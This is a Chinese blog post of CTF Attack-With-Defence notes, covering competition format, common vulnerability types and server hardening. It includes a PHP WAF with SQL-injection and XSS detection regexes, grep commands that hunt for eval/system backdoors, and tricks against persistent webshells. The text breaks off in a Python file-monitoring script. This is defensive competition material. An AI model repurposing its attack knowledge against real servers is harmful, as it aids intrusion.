<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
0x02 出题思路1:题目类型">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF AWD模式攻防Note">
<meta property="og:url" content="http://zer0yu.github.io/2018/05/24/ctf-awd-note/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
0x02 出题思路1:题目类型">
<meta property="og:updated_time" content="2018-12-13T15:01:28.715Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF AWD模式攻防Note">
<meta name="twitter:description" content="0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。
0x02 出题思路1:题目类型">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>CTF AWD模式攻防Note</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">خانه</a></li>
         
          <li><a href="/About/">درباره</a></li>
         
          <li><a href="/archives/">نوشته‌ها</a></li>
         
          <li><a href="https://github.com/zer0yu">پروژه‌ها</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/06/18/upload-labs-note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/05/23/decode-garble-phpcode/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">پست پیشین</span>
      <span id="i-next" class="info" style="display:none;">پست یعدی</span>
      <span id="i-top" class="info" style="display:none;">بازگشت به بالا</span>
      <span id="i-share" class="info" style="display:none;">اشتراک‌گذاری</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/05/24/ctf-awd-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&text=CTF AWD模式攻防Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&is_video=false&description=CTF AWD模式攻防Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF AWD模式攻防Note&body=Check out this article: http://zer0yu.github.io/2018/05/24/ctf-awd-note/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&title=CTF AWD模式攻防Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/05/24/ctf-awd-note/&name=CTF AWD模式攻防Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-AWD模式"><span class="toc-number">1.</span> <span class="toc-text">0x01 AWD模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-出题思路"><span class="toc-number">2.</span> <span class="toc-text">0x02 出题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-题目类型"><span class="toc-number">2.1.</span> <span class="toc-text">1:题目类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-代码类型"><span class="toc-number">2.2.</span> <span class="toc-text">2:代码类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-题目漏洞类型"><span class="toc-number">2.3.</span> <span class="toc-text">3:题目漏洞类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-出题人思路"><span class="toc-number">2.4.</span> <span class="toc-text">4:出题人思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-拿flag方式"><span class="toc-number">2.5.</span> <span class="toc-text">5:拿flag方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-防御技巧"><span class="toc-number">3.</span> <span class="toc-text">0x03 防御技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-攻击技巧"><span class="toc-number">4.</span> <span class="toc-text">0x04 攻击技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-参考"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CTF AWD模式攻防Note
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-05-24T11:27:47.000Z" itemprop="datePublished">2018-05-24</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x01-AWD模式"><a href="#0x01-AWD模式" class="headerlink" title="0x01 AWD模式"></a>0x01 AWD模式</h3><p>Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。<br>比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。</p>
<h3 id="0x02-出题思路"><a href="#0x02-出题思路" class="headerlink" title="0x02 出题思路"></a>0x02 出题思路</h3><h4 id="1-题目类型"><a href="#1-题目类型" class="headerlink" title="1:题目类型"></a>1:题目类型</h4><p>  1-出题人自己写的cms，为了恶心然后加个so。</p>
<p>  2-常见或者不常见的cms。</p>
<p>  3-一些框架漏洞，比如ph师傅挖的CI这种</p>
<h4 id="2-代码类型"><a href="#2-代码类型" class="headerlink" title="2:代码类型"></a>2:代码类型</h4><p>目前来说，国内比赛依旧是php居多，当然也会有一些别的，比如py，lua这种。</p>
<h4 id="3-题目漏洞类型"><a href="#3-题目漏洞类型" class="headerlink" title="3:题目漏洞类型"></a>3:题目漏洞类型</h4><p>  1-sqli居多</p>
<p>  2-文件包含</p>
<p>  3-各种rce</p>
<p>  4-文件上传</p>
<h4 id="4-出题人思路"><a href="#4-出题人思路" class="headerlink" title="4:出题人思路"></a>4:出题人思路</h4><p>为了不让你们这群赛棍把题秒了，我直接放个未公开cms的0day把，算了，要不我自己加点东西。诶，等等，这样是不是有点难了，再放几个比较简单的洞把，直接在index.php或者web根目录下放个shell?</p>
<h4 id="5-拿flag方式"><a href="#5-拿flag方式" class="headerlink" title="5:拿flag方式"></a>5:拿flag方式</h4><p>1-是向内网一台机器发送http请求，返回请求中包含flag。</p>
<p>2-是例如/home目录下放置flag文件。</p>
<h3 id="0x03-防御技巧"><a href="#0x03-防御技巧" class="headerlink" title="0x03 防御技巧"></a>0x03 防御技巧</h3><p>1.分析流量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#在比赛服务器上抓取流量包</span></div><div class="line">sudo tcpdump <span class="_">-s</span> 0 -w flow.pcap port 80</div></pre></td></tr></table></figure>
<p>使用scp写个脚本实时将流量包拷贝到本地用wireshark进行分析</p>
<p>2.分析日志</p>
<p>1).<a href="https://github.com/wupco/weblogger" target="_blank" rel="external">weblogger</a></p>
<p>2).<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="external">LogForensics 腾讯实验室</a></p>
<p>3).<a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="external">北风飘然@金乌网络安全实验室</a></p>
<p>4).<a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="external">网络ID为piaox的安全从业人员</a></p>
<p>5).<a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="external">网络ID：SecSky</a></p>
<p>6).<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="external">网络ID：鬼魅羊羔</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 日志地址</span></div><div class="line">/var/<span class="built_in">log</span>/apache2/</div><div class="line">/usr/<span class="built_in">local</span>/apache2/logs</div><div class="line">/usr/nginx/logs/</div></pre></td></tr></table></figure>
<p>3.打包源码&amp;备份数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 打包目录</span></div><div class="line">tar -zcvf archive_name.tar.gz directory_to_compress</div><div class="line"><span class="comment"># 解包</span></div><div class="line">tar -zxvf archive_name.tar.gz</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 备份指定的多个数据库</span></div><div class="line">mysqldump -u root -p --databases choose <span class="built_in">test</span> &gt; /tmp/db.sql</div><div class="line"><span class="comment"># 恢复备份，在mysql终端下执行：</span></div><div class="line"><span class="comment"># 命令格式：source FILE_PATH</span></div><div class="line"><span class="built_in">source</span> ~/db.sql</div><div class="line"><span class="comment"># 曾经遇到一个备份有问题可以执行下面</span></div><div class="line">mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql</div><div class="line"><span class="comment"># 重置mysql密码</span></div><div class="line"><span class="comment"># 方法1：用SET PASSWORD命令  </span></div><div class="line">mysql&gt; <span class="built_in">set</span> password <span class="keyword">for</span> 用户名@localhost = password(<span class="string">'新密码'</span>);</div><div class="line"><span class="comment"># 方法2：用mysqladmin </span></div><div class="line">mysqladmin -u用户名 -p旧密码 password 新密码</div></pre></td></tr></table></figure>
<p>4.重置ssh密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh登录后执行</span></div><div class="line">passwd</div></pre></td></tr></table></figure>
<p>5.部署waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//Code By Safe3 </span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr, $errfile, $errline)</span></span></div><div class="line">&#123; </div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;"</span>;</div><div class="line"> <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line">set_error_handler(<span class="string">"customError"</span>,E_ERROR);</div><div class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</div><div class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</div><div class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;  </div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_array($StrFiltValue))</div><div class="line">&#123;</div><div class="line">    $StrFiltValue=implode($StrFiltValue);</div><div class="line">&#125;  </div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="comment">//slog("&lt;br&gt;&lt;br&gt;操作IP: ".$_SERVER["REMOTE_ADDR"]."&lt;br&gt;操作时间: ".strftime("%Y-%m-%d %H:%M:%S")."&lt;br&gt;操作页面:".$_SERVER["PHP_SELF"]."&lt;br&gt;提交方式: ".$_SERVER["REQUEST_METHOD"]."&lt;br&gt;提交参数: ".$StrFiltKey."&lt;br&gt;提交数据: ".$StrFiltValue);</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"360websec notice:Illegal operation!"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">&#125;      </div><div class="line">&#125;  </div><div class="line"><span class="comment">//$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);</span></div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    StopAttack($key,$value,$getfilter);</div><div class="line">&#125;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    StopAttack($key,$value,$postfilter);</div><div class="line">&#125;</div><div class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    StopAttack($key,$value,$cookiefilter);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (file_exists(<span class="string">'update360.php'</span>)) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"请重命名文件update360.php，防止黑客利用&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">slog</span><span class="params">($logs)</span></span></div><div class="line">&#123;</div><div class="line">  $toppath=$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>].<span class="string">"/log.htm"</span>;</div><div class="line">  $Ts=fopen($toppath,<span class="string">"a+"</span>);</div><div class="line">  fputs($Ts,$logs.<span class="string">"\r\n"</span>);</div><div class="line">  fclose($Ts);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>使用方法：<br>(1).将waf.php传到要包含的文件的目录<br>(2).在页面中加入防护，有两种做法，根据情况二选一即可：<br>a).在所需要防护的页面加入代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">require_once(&apos;waf.php&apos;);</div></pre></td></tr></table></figure>
<p>就可以做到页面防注入、跨站<br>如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！<br>添加require_once(‘waf.php’);来调用本代码<br>常用php系统添加文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PHPCMS V9 \phpcms\base.php</div><div class="line">PHPWIND8.7 \data\sql_config.php</div><div class="line">DEDECMS5.7 \data\common.inc.php</div><div class="line">DiscuzX2   \config\config_global.php</div><div class="line">Wordpress   \wp-config.php</div><div class="line">Metinfo   \include\head.php</div></pre></td></tr></table></figure>
<p>b).在每个文件最前加上代码<br>在php.ini中找到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Automatically add files before or after any PHP document.</div><div class="line">auto_prepend_file = 360_safe3.php路径;</div></pre></td></tr></table></figure>
<p>需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。</p>
<p>如果不能部署waf我们可以简单的写个apache配置文件来禁止PHP执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;Directory &quot;/var/www/html/&quot;&gt;</div><div class="line">Options -ExecCGI -Indexes</div><div class="line">AllowOverride None</div><div class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</div><div class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</div><div class="line">php_flag engine off</div><div class="line">&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</div><div class="line"> deny from all</div><div class="line">&lt;/FilesMatch&gt;</div><div class="line">&lt;/Directory&gt;</div></pre></td></tr></table></figure>
<p>6.干掉不死马的方式</p>
<p>(1).<code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p>
<p>(2).重启php等web服务</p>
<p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p>
<p>(4).创建一个和不死马生成的马一样名字的文件夹。</p>
<p>7.修改curl命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">alias</span> curl=<span class="string">'echo fuckoff'</span>  <span class="comment">#权限要求较低</span></div><div class="line"><span class="comment"># 或者</span></div><div class="line"><span class="built_in">alias</span> curl=<span class="string">'python -c "__import__(\"sys\").stdout.write(\"flag&#123;%s&#125;\\n\" % (__import__(\"hashlib\").md5(\"\".join([__import__(\"random\").choice(__import__(\"string\").letters) for i in range(0x10)])).hexdigest()))"'</span></div><div class="line">chmod -x curl  <span class="comment">#权限要求较高</span></div><div class="line">/usr/bin  curl路径</div></pre></td></tr></table></figure>
<p>8.用D盾扫描源代码删除后门文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 简单的查找后门</span></div><div class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'eval('</span></div><div class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'assert('</span></div><div class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'system('</span></div></pre></td></tr></table></figure>
<p>9.查找常见备份文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 例如bak文件</span></div><div class="line">find / -name <span class="string">"*.bak"</span></div></pre></td></tr></table></figure>
<p>10.重置web的各种登录密码（如果比赛check认为修改密码算down就不要修改了）</p>
<p>11.将<code>uploads</code>等文件夹使用<code>chattr</code>对文件底层属性进行控制。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">chattr命令的用法：chattr [ -RVf ] [ -v version ] [ mode ] files…</div><div class="line">最关键的是在[mode]部分，[mode]部分是由+-=和[ASacDdIijsTtu]这些字符组合的，这部分是用来控制文件的</div><div class="line">属性。</div><div class="line"></div><div class="line">+ ：在原有参数设定基础上，追加参数。</div><div class="line">- ：在原有参数设定基础上，移除参数。</div><div class="line">= ：更新为指定参数设定。</div><div class="line">A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。</div><div class="line">S：硬盘I/O同步选项，功能类似sync。</div><div class="line">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</div><div class="line">c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。</div><div class="line">d：即no dump，设定文件不能成为dump程序的备份目标。</div><div class="line">i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。</div><div class="line">j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。</div><div class="line">s：保密性地删除文件或目录，即硬盘空间被全部收回。</div><div class="line">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</div><div class="line">各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</div><div class="line"></div><div class="line">应用举例：</div><div class="line"></div><div class="line">用chattr命令防止系统中某个关键文件被修改：</div><div class="line"><span class="comment"># chattr +i /etc/resolv.conf</span></div></pre></td></tr></table></figure>
<p>12.部署文件监控，如果发现新上传文件或者文件被修改立即恢复</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--</span></div><div class="line"><span class="comment"># v demo 0.21 修改了备份的webshell会自己坑自己的情况</span></div><div class="line"><span class="comment"># todo: windows下不支持中文目录</span></div><div class="line"><span class="comment">#use: python file_check.py ./</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"><span class="keyword">import</span> 